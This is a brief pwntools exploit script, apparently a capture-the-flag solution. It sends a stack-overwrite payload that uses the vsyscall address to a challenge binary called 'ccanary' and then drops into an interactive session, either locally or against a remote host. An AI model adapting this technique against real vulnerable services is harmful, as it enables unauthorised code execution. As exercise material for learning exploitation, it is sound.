from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # GDB NOASLR
        context.terminal = ["/mnt/c/wsl_terminal/wsl-terminal/open-wsl.exe", "-e"]
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # REMOTE server port
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
       
gdbscript = '''
init-pwndbg
b *main+100
c
'''.format(**locals())


exe = './ccanary'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = start()
# http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/13/vsyscall-and-vdso
payload = flat({
    31: [
    	0xffffffffff600000, # vsyscall
    	1
    ]	
})
# write('plFile', payload)

io.sendlineafter(b'quote> ', payload)

io.interactive()